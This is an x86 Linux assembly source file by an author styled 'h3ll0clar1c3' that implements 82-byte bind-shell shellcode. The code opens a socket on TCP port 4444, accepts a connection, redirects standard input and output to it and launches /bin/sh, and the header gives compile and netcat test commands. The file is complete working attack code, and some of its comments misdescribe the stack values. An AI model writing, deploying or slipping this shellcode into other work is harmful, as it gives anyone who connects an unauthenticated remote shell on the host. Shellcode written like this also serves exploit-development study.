; Filename: shell_bind_tcp.nasm
; Author: h3ll0clar1c3
; Purpose: Bbind shellcode on TCP port 4444, spawn a shell on incoming connection
; Compilation: ./compile.sh shell_bind_tcp
; Usage: ./shell_bind_tcp
; Testing: nc 127.0.0.1 4444
; Shellcode size: 82 bytes
; Architecture: x86

global	 _start

section .text
	_start: 

	; initialize registers
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
	
	; 1st syscall - create socket
	mov al, 0x66    ; hex value for socket
	mov bl, 0x02    ; PF_INET value from /usr/include/i386-linux-gnu/bits/socket.h
	mov cl, 0x01    ; setting SOCK_STREAM, value from /usr/include/i386-linux-gnu/bits/socket.h
	int 0x80        ; call the interrupt to create the socket, execute the syscall 
	mov edi, eax    ; move the value of eax into edi for later reference
	
	; 2nd syscall - bind socket to IP/Port in sockaddr struct 
	xor eax, eax    ; clear register
	mov al, 0x66	; hex value for socket
	mov ebx, edi    ; move the value of edi (socket) into ebx
	xor ecx, ecx    ; clear register, place bind
	push ecx	; push all zeros on the stack, equals IP parameter of 0.0.0.0
    	push ecx	; push all zeros on the stack, equals IP parameter of 0.0.0.0
    	push word 0x5c11; bind port 4444 is set
    	push word 0x02	; AF_INET
    	mov ecx, esp	; move esp into ecx, store the const struct sockaddr *addr argument
    	mov dl, 16	; move the value of 16 into edx
    	int 0x80	; call the interrupt to execute the bind syscall
	
	; 3rd syscall - listen for incoming connections 
	xor eax, eax	; clear register
    	mov ax, 0x16b	; syscall for listen moved into eax
	mov ebx, edi	; move value of socket stored in edi into ebx
   	xor ecx, ecx	; clear register, place listen
    	int 0x80	; call the interrupt to execute the listen syscall
	
	; 4th syscall - accept incoming connections 
	xor eax, eax    ; clear register
   	mov ax, 0x16c	; syscall for accept4 moved into eax
	mov ebx, edi    ; reference in stored EDI
	xor ecx, ecx    ; addr = 0
	xor edx, edx    ; addrlen = 0
	xor esi, esi    ; flags = 0
	int 0x80	; call the interrupt to execute accept syscall
	xor edi, edi    ; clear socket value stored in edi
	mov edi, eax    ; save return value from eax into edi	
	
	; 5th syscall - duplicate file descriptors for STDIN, STDOUT and STDERR 
	mov cl, 0x3     ; move 3 in the counter loop (stdin, stdout, stderr)     
 	
	loop_dup2:
	xor eax, eax    ; clear register
   	mov al, 0x3f    ; move the dup2 syscall code into the lower part of eax
   	mov ebx, edi    ; move the new int sockfd (stored in edi) into ebx
   	dec cl          ; decrement cl by 1
   	int 0x80	; call interrupt to execute dup2 syscall
    	jnz loop_dup2   ; jump back to the top of loop_dup2 if the zero flag is not set
	
	; 6th syscall - execute /bin/sh using execve 
	xor eax, eax	; clear register, place execve
	push eax	; terminator placed onto the stack with value of 0
	push 0x68732f6e	; push the end of "//bin/sh", 'hs/n'
	push 0x69622f2f	; push the beginning of "//bin/sh", 'ib//'
	mov ebx, esp	; move pointer to '//bin/sh' into ebx, null terminated
	push eax	; push 0 onto the stack
	mov edx, esp	; move pointer to '//bin/sh' into edx, null terminated
	push ebx	; push 0 onto the stack
	mov ecx, esp	; move pointer to '//bin/sh' into ecx, null terminated
	mov al, 0x0b	; move syscall code for execve into al
  	int 0x80	; call the interrupt to execute execve syscall, execute '//bin/sh' shell
